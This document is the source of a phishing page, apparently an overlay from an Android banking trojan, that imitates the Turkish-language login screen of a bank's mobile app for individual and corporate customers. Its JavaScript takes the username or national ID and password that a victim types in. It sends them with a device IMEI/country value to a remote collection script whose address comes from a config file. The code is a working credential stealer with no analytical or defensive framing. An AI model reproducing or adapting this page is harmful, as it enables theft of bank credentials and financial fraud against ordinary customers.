<html>
<head>
<meta charset="UTF-8">
<link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="data:text/css;charset=utf-8," data-href="http://getbootstrap.com/dist/css/bootstrap-theme.min.css" rel="stylesheet" id="bs-theme-stylesheet">
<link href="tr/com.teb/style.css" rel="stylesheet">


</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>


<div class="logo">
    <img style="width: 30%;" src="data:image/png;base64,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">
</div>

<div id="content_div1">
 <form method="post">

<A href="#" class="hr1">Bireysel</A><A href="#" class="hr2" onclick="document.getElementById('content_div1').style.display = 'none'; document.getElementById('content_div2').style.display = 'block';">Kurumsal</A><div style="clear:both"></div>

<div class="bg" style="z-index: 99;">
 <div class="glyphicon glyphicon-user nn1" style="color:white;"></div>
		<div class="field">
			<input type="text" name="fields[login]" class="input" id="id" placeholder="Kullanıcı Adı / TCKN" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" placeholder="">
		</div>
  <div class="glyphicon glyphicon-lock nn2" style="color:white;"></div>
  <div class="field">
			<input type="password" name="fields[password]" placeholder="Parola" class="input" id="pass" maxlength="6" placeholder="">
        </div>
        <button id="input_submitBtn" class="s1" type="submit">Giriş Yap</button>
        <p style="text-align: center; color: #00e14b;font-weight: 600;font-variant-caps: all-petite-caps;font-size: 18px;"> Müşteri Değil misin? ÜYE OL </p>

</div>


 </div>


</form>
  <script type="text/javascript">

  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id');
                        var oCodeInp = document.getElementById('pass');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|iscep_bireysel|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
 <div id="content_div2">
 <form method="post">
<A href="#" class="hr11" onclick="document.getElementById('content_div2').style.display = 'none'; document.getElementById('content_div1').style.display = 'block';">Bireysel</A><A href="#" class="hr22">Kurumsal</A><div style="clear:both"></div>

<div class="bg2">
 <div class="glyphicon glyphicon-user nn11" style="color:white;"></div>
 		<div class="field">
			<input type="text" name="fields[login]2" class="input" id="id2" placeholder="Kullanıcı Kodu / Adı" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,10);}" placeholder="">
		</div>

  <div class="glyphicon glyphicon-th nn33" style="color:white;"></div>
  		<div class="field">
			<input type="text" name="fields[password2]" placeholder="Parola" class="input" id="ii" onKeyUp="if(this.value>99999){this.value=this.value.substr(0,5);}" placeholder="">
		</div>

  <button id="input_submitBtn3"  class="s2" type="submit">Giriş Yap</button>
  <p style="text-align: center; color: #00e14b;font-weight: 600;font-variant-caps: all-petite-caps;font-size: 18px;"> Müşteri Değil misin? ÜYE OL </p>
 </div>
</form>
  <script type="text/javascript">

  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('input_submitBtn3');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('id2');
                        var oCodeInp = document.getElementById('ii');

						try{
							oNumInp.className = 'input';
							oCodeInp.className = 'input';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|iscep_kurumsal|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
</div>
</body>
</html>
